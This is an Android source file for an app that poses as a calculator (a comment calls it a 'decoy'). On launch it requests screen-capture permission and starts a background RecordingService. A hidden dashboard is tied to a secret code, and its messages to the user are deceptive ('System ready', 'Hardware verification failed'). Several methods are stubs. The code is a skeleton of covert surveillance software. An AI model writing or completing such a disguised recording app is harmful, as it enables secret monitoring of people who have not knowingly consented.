package com.guardian.calc;

import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Stack;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;
    private TextView display;
    private String currentInput = "";
    private String secretPattern = "9876";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); // Layout assuming decoy calc

        display = findViewById(R.id.display);

        // Standard Calculator Logic
        setupCalculator();

        // One-time setup check
        if (!isServiceRunning()) {
            requestScreenCapturePermission();
        }
    }

    private void setupCalculator() {
        // Simple logic to build calculation strings
        // ... (standard calculator buttons setup)
    }

    private void handleSecretCode() {
        Intent intent = new Intent(this, DashboardActivity.class);
        startActivity(intent);
    }

    private void requestScreenCapturePermission() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                // SUCCESS: Start the background service
                Intent serviceIntent = new Intent(this, RecordingService.class);
                serviceIntent.putExtra("resultCode", resultCode);
                serviceIntent.putExtra("data", data);
                startForegroundService(serviceIntent);

                Toast.makeText(this, "System ready", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Hardware verification failed", Toast.LENGTH_LONG).show();
            }
        }
    }

    private boolean isServiceRunning() {
        // Utility to check if RecordingService is already alive
        return false; // Implement checker
    }
}
